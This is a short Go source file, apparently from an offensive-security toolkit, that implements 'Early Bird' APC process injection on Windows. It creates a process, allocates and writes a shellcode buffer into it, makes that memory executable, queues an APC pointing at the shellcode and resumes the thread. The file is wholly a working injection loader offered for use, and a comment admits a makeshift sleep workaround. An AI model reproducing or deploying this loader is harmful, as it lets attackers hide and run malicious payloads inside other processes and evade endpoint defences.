package injection

import (
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func EarlyBird() {
	fmt.Println("Starting QueueUserApc (EarlyBird)")

	procInfo := createProcess()
	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	// Workaround, cannot write to process memory before allocation finished, will have to fix for later.
	time.Sleep(2)
	WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)

	windows.ResumeThread(procInfo.Thread)
	windows.CloseHandle(procInfo.Process)
	windows.CloseHandle(procInfo.Thread)
	fmt.Println("Finished QueueUserApc (EarlyBird)")
}
